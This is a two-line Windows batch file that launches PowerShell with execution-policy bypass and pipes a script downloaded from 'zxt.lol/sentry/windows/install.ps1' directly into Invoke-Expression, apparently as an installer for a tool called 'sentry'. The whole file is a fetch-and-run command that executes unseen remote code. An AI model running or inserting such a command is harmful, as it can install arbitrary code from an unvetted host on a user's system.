@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; irm 'https://zxt.lol/sentry/windows/install.ps1' | iex"
